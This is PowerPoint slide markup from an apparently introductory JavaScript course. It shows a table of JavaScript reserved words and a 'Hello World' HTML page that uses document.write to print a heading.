                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>float</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>for</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>function</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>goto</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>if</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>implements</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>import</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>in</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="28575" marR="28575" marT="28569" marB="28569">
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>instanceof</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>int</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>interface</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>let</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>long</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>native</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>new</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>null</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>package</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>private</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>protected</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>public</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>return</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>short</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>static</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>super</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="28575" marR="28575" marT="28569" marB="28569">
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>switch</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>synchronized</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>this</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>throw</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>throws</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>transient</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>true</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>try</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>typeof</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>var</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>void</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>volatile</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>while</a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en-US" sz="1800" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>with</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="28575" marR="28575" marT="28569" marB="28569">
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="10000"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16399" name="Tekstikehys 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5268A9DA-D6BA-4A3C-B0DE-89C491021BA0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1995488" y="6021388"/>
            <a:ext cx="5072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fi-FI" sz="1800" dirty="0"/>
              <a:t>you cannot used them </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800"/>
              <a:t>as variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0"/>
              <a:t>or function name.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tsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E4EDB60-7467-4CD2-A7BA-EF540E944DB6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Hello World in JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{968C245B-601E-4270-A3BF-D5BD4A6C362C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;!DOCTYPE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>html</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;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head</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meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>charset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"utf-8"</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title</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>title</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meta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>viewport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>device-width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>initial-scale</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1"</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head</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body</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script</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document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ÄÖZ&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>h1&gt;"</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script</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body</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800000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
